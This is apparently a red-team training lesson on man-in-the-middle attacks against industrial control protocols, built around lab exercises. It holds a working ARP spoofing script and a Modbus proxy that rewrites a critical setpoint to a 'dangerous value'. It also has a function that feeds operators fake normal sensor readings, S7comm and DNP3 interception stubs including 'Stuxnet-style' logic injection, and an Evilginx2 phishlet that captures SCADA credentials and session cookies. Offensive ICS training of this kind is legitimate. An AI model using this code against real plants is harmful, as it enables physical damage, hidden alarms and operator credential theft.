Lesson 03: Man-in-the-Middle Attacks

Lesson 03: Man-in-the-Middle Attacks on
Industrial Protocols
Learning Objectives
●​
●​
●​
●​
●​

Execute ARP spoofing attacks in OT networks
Implement protocol-aware MITM proxies for Modbus, S7comm, DNP3
Manipulate industrial traffic in real-time
Perform SSL/TLS interception on OPC UA
Develop custom MITM tools for ICS environments

1. MITM Attack Fundamentals in OT
1.1 Why MITM is Critical in ICS
Impact of MITM in OT:
●​
●​
●​
●​
●​

Real-time manipulation: Modify control commands mid-flight
Sensor spoofing: Alter sensor values to operators
Alarm suppression: Block critical alarms
Data integrity: Tamper with historian data
Stealth: Invisible to endpoint security (occurs on network)

1.2 MITM Attack Vectors
Attack Positioning Options:
┌────────────────────────────────────┐
│ 1. Network Switch (ARP Spoofing) │
│ SCADA ←→ [ATTACKER] ←→ PLC │
│
│
│ 2. Router/Gateway Compromise
│
│ OT Network ←→ [ROUTER*] ←→ IT │
│
│
│ 3. Rogue Access Point
│
│ Wireless HMI ←→ [AP*] ←→ SCADA│
│
│
│ 4. Engineering Workstation
│
│ EWS* ←→ PLC (legitimate path) │
└────────────────────────────────────┘

2. ARP Spoofing in OT Networks

2.1 ARP Cache Poisoning
Basic ARP Spoofing Script:
#!/usr/bin/env python3
from scapy.all import *
import time
import sys
def arp_spoof(target_ip, gateway_ip, interface="eth0"):
"""
ARP spoofing to position as MITM
"""
# Get MAC addresses
target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)
if not target_mac or not gateway_mac:
print("[-] Could not resolve MAC addresses")
return
print(f"[*] Target: {target_ip} ({target_mac})")
print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
print("[*] Starting ARP spoofing...")
try:
while True:
# Tell target we are the gateway
send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
verbose=False)
# Tell gateway we are the target
send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
verbose=False)
time.sleep(2)
except KeyboardInterrupt:
print("\n[*] Restoring ARP tables...")
# Restore original ARP entries
send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip,
hwsrc=gateway_mac), count=5, verbose=False)
send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,
hwsrc=target_mac), count=5, verbose=False)
# Enable IP forwarding
import os
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Usage: arp_spoof('192.168.1.10', '192.168.1.1')

2.2 Targeted OT ARP Spoofing
SCADA ↔ PLC MITM:
def ot_mitm_positioning(scada_ip, plc_ip):
"""
Position between SCADA server and PLC
"""
from scapy.all import ARP, send, getmacbyip
import time
scada_mac = getmacbyip(scada_ip)
plc_mac = getmacbyip(plc_ip)
print(f"[*] Poisoning ARP: SCADA {scada_ip} ←→ PLC {plc_ip}")
while True:
# Tell SCADA we are the PLC
send(ARP(op=2, pdst=scada_ip, hwdst=scada_mac, psrc=plc_ip), verbose=False)
# Tell PLC we are SCADA
send(ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=scada_ip), verbose=False)
time.sleep(2)
# ot_mitm_positioning('192.168.1.50', '192.168.1.100')

3. Modbus MITM Proxy
3.1 Transparent Modbus Proxy
Modbus TCP Interceptor:
#!/usr/bin/env python3
import socket
import threading
import struct
class ModbusMITMProxy:
def __init__(self, listen_port, target_ip, target_port):
self.listen_port = listen_port
self.target_ip = target_ip
self.target_port = target_port

def handle_client(self, client_socket):
"""
Handle incoming client connection (SCADA)
"""
# Connect to real PLC
plc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
plc_socket.connect((self.target_ip, self.target_port))
# Relay traffic bidirectionally
threading.Thread(target=self.forward, args=(client_socket, plc_socket,
"SCADA→PLC")).start()
threading.Thread(target=self.forward, args=(plc_socket, client_socket,
"PLC→SCADA")).start()
def forward(self, source, destination, direction):
"""
Forward traffic between client and PLC with inspection/modification
"""
while True:
try:
data = source.recv(4096)
if not data:
break
# Parse Modbus packet
modified_data = self.inspect_and_modify(data, direction)
# Forward (potentially modified)
destination.send(modified_data)
except Exception as e:
break
def inspect_and_modify(self, data, direction):
"""
Inspect and optionally modify Modbus traffic
"""
if len(data) < 8:
return data
# Parse MBAP header
trans_id = struct.unpack('>H', data[0:2])[0]
proto_id = struct.unpack('>H', data[2:4])[0]
length = struct.unpack('>H', data[4:6])[0]
unit_id = data[6]
func_code = data[7]
print(f"[{direction}] Trans ID: {trans_id}, FC: 0x{func_code:02X}, Unit: {unit_id}")

# Attack Vector 1: Modify write commands
if func_code == 0x06 and direction == "SCADA→PLC": # Write Single Register
# Extract register address and value
register = struct.unpack('>H', data[8:10])[0]
value = struct.unpack('>H', data[10:12])[0]
print(f"

[!] Write to register {register}: {value}")

# Malicious modification
if register == 100: # Critical setpoint register
new_value = 9999 # Dangerous value
modified_data = data[:10] + struct.pack('>H', new_value)
print(f" [ATTACK] Modified value: {value} → {new_value}")
return modified_data
# Attack Vector 2: Suppress alarms (block specific reads)
if func_code == 0x03 and direction == "PLC→SCADA": # Read Holding Registers
response
# Could modify sensor values in response
pass
return data # Return unmodified if no attack
def start(self):
"""
Start proxy server
"""
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('0.0.0.0', self.listen_port))
server.listen(5)
print(f"[*] Modbus MITM proxy listening on port {self.listen_port}")
print(f"[*] Forwarding to {self.target_ip}:{self.target_port}")
while True:
client_socket, addr = server.accept()
print(f"[+] Connection from {addr}")
threading.Thread(target=self.handle_client, args=(client_socket,)).start()
# Usage:
# proxy = ModbusMITMProxy(listen_port=502, target_ip='192.168.1.100', target_port=502)
# proxy.start()

3.2 Modbus Payload Manipulation Examples
Attack Scenario: Sensor Spoofing:

def modbus_sensor_spoofing_mitm(data, direction):
"""
Spoof sensor values in Modbus responses
Hide dangerous conditions from operators
"""
if direction == "PLC→SCADA":
func_code = data[7]
if func_code == 0x03: # Read Holding Registers response
byte_count = data[8]
registers = []
# Parse register values
for i in range(0, byte_count, 2):
value = struct.unpack('>H', data[9+i:11+i])[0]
registers.append(value)
print(f"

Original sensor values: {registers}")

# Spoof: Replace all values with "normal" values
spoofed_registers = [50] * len(registers) # All sensors read "50"
# Rebuild response packet
modified_data = data[:9]
for value in spoofed_registers:
modified_data += struct.pack('>H', value)
print(f" Spoofed sensor values: {spoofed_registers}")
return modified_data
return data

4. S7comm MITM Attacks
4.1 S7comm Transparent Proxy
S7 Protocol Interceptor:
class S7commMITMProxy:
def inspect_s7comm(self, data, direction):
"""
Inspect S7comm traffic
"""
if len(data) < 10:
return data
# Check for TPKT header

if data[0:2] != b'\x03\x00':
return data
tpkt_length = struct.unpack('>H', data[2:4])[0]
# Check for COTP Data packet (0xF0)
if len(data) > 5 and data[5] == 0xF0:
# S7comm header starts at offset 7
protocol_id = data[7]
rosctr = data[8] # Message type
if protocol_id == 0x32: # S7comm
print(f"[{direction}] S7comm ROSCTR: 0x{rosctr:02X}")
# Attack: Intercept program download
if rosctr == 0x01: # Job request
func_code = data[17] if len(data) > 17 else 0
print(f" Function: 0x{func_code:02X}")
# FC 0x1D: Start Upload (program extraction)
if func_code == 0x1D:
print(" [!] DETECTED: Program upload in progress")
# FC 0x28: PLC Control (start/stop)
if func_code == 0x28:
print(" [!] DETECTED: PLC control command")
# Could block PLC STOP command here
# Or modify to force STOP
return data
# Integrate into proxy similar to Modbus example

4.2 PLC Logic Injection via MITM
Inject Malicious Logic During Download:
def s7_program_download_injection(data, direction):
"""
Inject malicious code when engineer downloads program to PLC
Stuxnet-style attack
"""
if direction == "EWS→PLC":
# Detect program download
if b'\x1B' in data: # Download Block function
print("[!] Program download detected")

# Extract block data
# Append malicious ladder logic
# (Requires MC7 bytecode generation)
# malicious_rung = b'\x...' # MC7 opcodes
# modified_data = data + malicious_rung
print("[ATTACK] Malicious logic injected into download")
# return modified_data
return data

5. DNP3 MITM Attacks
5.1 DNP3 Command Manipulation
CROB Interception and Modification:
def dnp3_crob_mitm(data, direction):
"""
Intercept and modify DNP3 CROB commands
"""
if len(data) < 10:
return data
# Check for DNP3 start bytes
if data[0:2] != b'\x05\x64':
return data
print(f"[{direction}] DNP3 packet detected")
# Parse Data Link Layer
length = data[2]
control = data[3]
func_code = control & 0x0F
if func_code == 0x04: # User Data
# Parse Application Layer
# Look for CROB (Control Relay Output Block) - Group 12
if b'\x0C\x01' in data: # Group 12, Variation 1 (CROB)
print(" [!] CROB detected")
# Modify CROB parameters
# Example: Change ON time from 100ms to 10000ms
# (Causes breaker to be in wrong state)

print("

[ATTACK] CROB timing modified")

return data

6. OPC UA SSL/TLS Interception
6.1 OPC UA Certificate-Based MITM
SSL Stripping or Certificate Replacement:
def opcua_tls_mitm():
"""
Intercept OPC UA encrypted traffic
Requires certificate manipulation
"""
# Option 1: SSL Stripping (downgrade to no encryption)
# Modify OPC UA endpoint advertisement to remove SignAndEncrypt modes
# Option 2: Certificate Replacement
# Generate rogue certificate signed by trusted CA (if compromised)
# Option 3: Exploit weak security policies
# Force connection to use None or Basic128Rsa15 (deprecated)
print("[*] OPC UA MITM requires:")
print(" 1. Rogue CA certificate installed on client")
print(" 2. Or force SecurityMode: None")
print(" 3. Or exploit certificate validation bugs")

7. Evilginx2 for OT Web Interfaces
Phishing OT Operators for HMI Credentials:
# Evilginx2 phishlet for Ignition SCADA
name: 'ignition'
author: '@icsredteam'
min_ver: '2.4.0'
proxy_hosts:
- {phish_sub: 'scada', orig_sub: '', domain: 'company.com', session: true, is_landing: true}
sub_filters:
- {triggers_on: 'scada.company.com', orig_sub: '', domain: 'company.com', search:
'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
auth_tokens:

- domain: '.company.com'
keys: ['JSESSIONID']
credentials:
username:
key: 'username'
search: '(.*)'
type: 'post'
password:
key: 'password'
search: '(.*)'
type: 'post'
login:
domain: 'scada.company.com'
path: '/system/gateway/j_security_check'
# Deploy: evilginx2 -p phishlets/ignition.yaml
# Capture HMI credentials when operator logs in via phishing link

8. Hands-On Lab Exercises
Lab 1: ARP Spoofing in OT Network
1.​ Set up lab: SCADA server (ScadaBR) ↔ PLC (OpenPLC)
2.​ Execute ARP spoofing to position as MITM
3.​ Verify traffic flows through attacker
4.​ Capture Modbus traffic in Wireshark
5.​ Document impact on network

Lab 2: Modbus MITM Proxy
1.​ Deploy Modbus MITM proxy script
2.​ Route SCADA traffic through proxy
3.​ Intercept write commands (FC 06)
4.​ Modify register values in real-time
5.​ Observe impact on process (simulated outputs)

Lab 3: S7comm Traffic Manipulation
1.​ Set up Siemens PLCSIM + TIA Portal
2.​ Implement S7comm proxy
3.​ Intercept program download operation
4.​ Log all S7comm function codes
5.​ Attempt to inject additional logic (research exercise)

Lab 4: DNP3 CROB Interception

1.​ Deploy DNP3 master/outstation simulator
2.​ Implement DNP3 MITM proxy
3.​ Intercept CROB commands
4.​ Modify CROB timing parameters
5.​ Document potential physical impact

9. Tools & Resources
MITM Tools
●​
●​
●​
●​

Ettercap: https://www.ettercap-project.org/
Bettercap: https://www.bettercap.org/
mitmproxy: https://mitmproxy.org/ (HTTP/HTTPS)
Scapy: https://scapy.net/ (Custom packet manipulation)

ICS-Specific
●​ ISF MITM Modules: Industrial Security Framework
●​ Custom Python Proxies: Based on protocol libraries

10. Knowledge Check
1.​ Why is MITM more impactful in OT than IT environments?
2.​ How does ARP spoofing work, and why is it effective in flat OT networks?
3.​ Describe the process of building a transparent Modbus proxy.
4.​ What are the attack vectors when intercepting S7comm traffic?
5.​ How would you modify DNP3 CROB commands mid-flight?
6.​ What challenges exist for OPC UA MITM attacks?
7.​ How can MITM be used to inject malicious PLC logic?
8.​ What defensive measures prevent MITM attacks in OT?
9.​ How would you detect an active MITM attack on your OT network?
10.​Describe the legal and safety implications of MITM testing in production OT

